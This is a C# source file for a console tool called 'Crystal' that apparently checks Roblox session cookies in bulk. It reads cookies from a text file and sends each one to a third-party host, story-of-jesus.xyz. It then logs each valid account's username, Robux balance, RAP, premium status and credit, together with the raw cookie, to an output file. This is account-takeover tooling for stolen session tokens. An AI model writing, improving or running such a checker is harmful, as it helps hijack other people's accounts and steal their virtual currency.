using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Crystal
{
    internal class Modules
    {
        public static void ReadCookies()
        {
            string GetDirectory = System.IO.File.ReadAllText(@"Config\CookiesDirectory.ini");
            if (GetDirectory.Contains("DEFAULT"))
            {
                GetDirectory = "Cookies.txt";

            }

            string cookies = GetDirectory;

            string file = new StreamReader(cookies).ReadToEnd();
            string[] lines = file.Split('\n');
            int CountCookies = lines.GetLength(0);
            //---END----
        }

        public static void ValidFile()
        {
            string time = DateTime.Now.ToString("h:mm:ss tt");

            if (File.Exists(@"Config\AutoRemoveDuplicates.ini"))
            {
                //OK
            }
            else
            {
                Console.Title = "CRYSTAL [MISSING-FILE]";
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write($"[{time}]");
                Console.ResetColor();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write(" CRYSTAL CONSOLE: ");
                Console.ResetColor();
                Console.Write("File ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("AutoRemoveDuplicates.ini");
                Console.ResetColor();
                Console.Write(" does not exist if this issue persist please reinstall crystal files");
                Console.ReadKey();
            }

            if (File.Exists(@"Config\CookiesDirectory.ini"))
            {
                //OK
            }
            else
            {
                Console.Title = "CRYSTAL [MISSING-FILE]";
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write($"[{time}]");
                Console.ResetColor();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write(" CRYSTAL CONSOLE: ");
                Console.ResetColor();
                Console.Write("File ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("CookiesDirectory.ini");
                Console.ResetColor();
                Console.Write(" does not exist if this issue persist please reinstall crystal files");
                Console.ReadKey();
            }

        }

        public static void cookiechecker()
        {

            

            try
            {
                string GetDirectory = System.IO.File.ReadAllText(@"Config\CookiesDirectory.ini");
                if (GetDirectory.Contains("DEFAULT"))
                {
                    GetDirectory = "Cookies.txt";

                }

                string cookies = GetDirectory;

                string file = new StreamReader(cookies).ReadToEnd();
                string[] lines = file.Split('\n');
                int CountCookies = lines.GetLength(0);


                for (int iv = 0; iv < 1; iv++)
                {
                    int totalrobux = 0;
                    int totalRap = 0;


                    File.WriteAllText("output.txt", "");

                    //INALIDS COUNTER 
                    int i = 0;

                    WebClient client = new WebClient();
                    Console.Title = $"CRYSTAL | COOKIES LOADED [{CountCookies}] | TOTAL ROBUX [0] | TOTAL RAP [0] | INVALIDS [{i}]";
                    List<string> allLines = new List<string>();
                    using (StreamReader reader = new StreamReader(GetDirectory))
                    {
                        string line;
                        while ((line = reader.ReadLine()) != null)
                        {
                            string time = DateTime.Now.ToString("h:mm:ss tt");
                            allLines.Add(line);
                            string api = client.DownloadString($"https://story-of-jesus.xyz/userinfo?cookie={line}");

                            var USERID = Regex.Match(api, $"\"userid\": (.+?),").Groups[1].Value;
                            var USERNAME = Regex.Match(api, $"\"username\": (.+?),").Groups[1].Value;
                            var ROBUX = Regex.Match(api, $"\"robux\": (.+?),").Groups[1].Value;
                            var RAP = Regex.Match(api, $"\"rap\": (.+?),").Groups[1].Value;
                            var PREMIUM = Regex.Match(api, $"\"premium\": (.+?),").Groups[1].Value;
                            var CREDIT = Regex.Match(api, $"\"credit\": (.+?),").Groups[1].Value;
                            var PENDINGROBUX = Regex.Match(api, $"\"pendingrobux\": (.+?),").Groups[1].Value;
                            var DOC = Regex.Match(api, $"\"datecreated\": (.+?),").Groups[1].Value;
                            var EMAILVERIFIED = Regex.Match(api, $"\"emailverified\": (.+?),").Groups[1].Value;


                            if(api.Contains("good"))
                            {

                                totalrobux = totalrobux + int.Parse(ROBUX);
                                totalRap = totalRap + int.Parse(RAP);
                                Console.Title = $"CRYSTAL | COOKIES LOADED [{CountCookies}] | TOTAL ROBUX [{totalrobux}] | TOTAL RAP [{totalRap}] | INVALIDS [{i}]";
                                Console.ForegroundColor = ConsoleColor.Yellow;
                                Console.Write($"[{time}]");
                                Console.ResetColor();
                                Console.ForegroundColor = ConsoleColor.Cyan;
                                Console.Write(" CRYSTAL CHECKER: ");
                                Console.ResetColor();
                                Console.Write($"ID :{USERID} | USERNAME: {USERNAME} | ROBUX {ROBUX} | RAP: {RAP} | PREMIUM: {PREMIUM} | CREDIT: {CREDIT} | PENDINGROBUX: {PENDINGROBUX} | DOC: {DOC} | EMAILVERIFIED: {EMAILVERIFIED}");

                              
                                File.AppendAllText("Output.txt", $"ID :{USERID} | USERNAME: {USERNAME} | ROBUX {ROBUX} | RAP: {RAP} | PREMIUM: {PREMIUM} | CREDIT: {CREDIT} | PENDINGROBUX: {PENDINGROBUX} | DOC: {DOC} | EMAILVERIFIED: {EMAILVERIFIED} | COOKIE: {line}" + Environment.NewLine);
                                Console.WriteLine("");
                            }
                            else
                            {


                                
                                
                                Console.ForegroundColor = ConsoleColor.Yellow;
                                Console.Write($"[{time}]");
                                Console.ResetColor();
                                Console.ForegroundColor = ConsoleColor.Cyan;
                                Console.Write(" CRYSTAL CHECKER: ");
                                Console.ResetColor();
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.Write("INVALID COOKIE");
                                //ADD 1 TO INVALIDS COUNTER
                                i++;
                                Console.Title = $"CRYSTAL | COOKIES LOADED [{CountCookies}] | TOTAL ROBUX [{totalrobux}] | TOTAL RAP [{totalRap}] | INVALIDS [{i}]";
                                Console.WriteLine();
                            }
                            
                        }
                    }


                }
                

            }
            catch(Exception)
            {
                Console.WriteLine();
                string time = DateTime.Now.ToString("h:mm:ss tt");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write($"[{time}]");
                Console.ResetColor();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write(" CRYSTAL CONSOLE: ");
                Console.ResetColor();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("Crystal crashed");
                Console.ReadKey();
            }
            



















        }
        public static void RemoveDuplicates()
        {
            try
            {
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine(@"   ___                           _  ");
                Console.WriteLine(@"  / (_)                         | | ");
                Console.WriteLine(@" |      ,_          , _|_  __,  | | ");
                Console.WriteLine(@" |     /  |  |   | / \_|  /  |  |/  ");
                Console.WriteLine(@"  \___/   |_/ \_/|/ \/ |_/\_/|_/|__/");
                Console.WriteLine(@"                /|                  ");
                Console.WriteLine(@"                \|                ");
                Console.ResetColor();
                Console.WriteLine();
                string GetDirectory = System.IO.File.ReadAllText(@"Config\CookiesDirectory.ini");
                if (GetDirectory.Contains("DEFAULT"))
                {
                    GetDirectory = "Cookies.txt";

                }

                string[] lines = File.ReadAllLines(GetDirectory);
                File.WriteAllLines("Output.txt", lines.Distinct().ToArray());
                string time = DateTime.Now.ToString("h:mm:ss tt");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write($"[{time}]");
                Console.ResetColor();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write(" CRYSTAL CONSOLE: ");
                Console.ResetColor();
                //
                int count = File.ReadAllLines(GetDirectory).Length;
                int count2 = File.ReadAllLines("Output.txt").Length;
                int total = count - count2;

                Console.Write($"Removed");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write($" {total}");
                Console.ResetColor();
                Console.Write($" duplicate cookies successfully and saved them to ");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write("Output.txt");

                var info = Console.ReadKey();
                if (info.Key == ConsoleKey.Enter)
                {
                    var fileName = Assembly.GetExecutingAssembly().Location;
                    System.Diagnostics.Process.Start(fileName);
                }
            }
            catch
            (Exception)
            {
                string time = DateTime.Now.ToString("h:mm:ss tt");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write($"[{time}]");
                Console.ResetColor();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write(" CRYSTAL CONSOLE: ");
                Console.ResetColor();
                Console.Write("ERROR 300 COULD NOT REMOVE DUPLICATE FILES.");
            }
            
        }

        public static void ProxyChecker()
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine(@"   ___                           _  ");
            Console.WriteLine(@"  / (_)                         | | ");
            Console.WriteLine(@" |      ,_          , _|_  __,  | | ");
            Console.WriteLine(@" |     /  |  |   | / \_|  /  |  |/  ");
            Console.WriteLine(@"  \___/   |_/ \_/|/ \/ |_/\_/|_/|__/");
            Console.WriteLine(@"                /|                  ");
            Console.WriteLine(@"                \|                ");
            Console.ResetColor();
            Console.WriteLine();

            string time = DateTime.Now.ToString("h:mm:ss tt");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write($"[{time}]");
            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("CRYSTAL CONSOLE: ");
            Console.ResetColor();
            Console.Write("FEATURE IS CURRENTLY DISABLED");
            var info = Console.ReadKey();
            if (info.Key == ConsoleKey.Enter)
            {
                var fileName = Assembly.GetExecutingAssembly().Location;
                System.Diagnostics.Process.Start(fileName);
            }
        }
        public static void settings()
        {
            try
            {
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine(@"   ___                           _  ");
                Console.WriteLine(@"  / (_)                         | | ");
                Console.WriteLine(@" |      ,_          , _|_  __,  | | ");
                Console.WriteLine(@" |     /  |  |   | / \_|  /  |  |/  ");
                Console.WriteLine(@"  \___/   |_/ \_/|/ \/ |_/\_/|_/|__/");
                Console.WriteLine(@"                /|                  ");
                Console.WriteLine(@"                \|                ");
                Console.ResetColor();
                Console.WriteLine();

                string time = DateTime.Now.ToString("h:mm:ss tt");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write($"[{time}]");
                Console.ResetColor();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("[1] CRYSTAL SETTINGS: ");
                Console.ResetColor();
                Console.Write("UNDERDEVELOPMENT");
                var info = Console.ReadKey();
                if (info.Key == ConsoleKey.Enter)
                {
                    var fileName = Assembly.GetExecutingAssembly().Location;
                    System.Diagnostics.Process.Start(fileName);
                }


            }
            catch(Exception)
            {
                string time = DateTime.Now.ToString("h:mm:ss tt");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write($"[{time}]");
                Console.ResetColor();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write(" CRYSTAL CONSOLE: ");
                Console.ResetColor();
                Console.Write("ERROR 300 COULD NOT REMOVE DUPLICATE FILES.");
            }
        }
    }
}
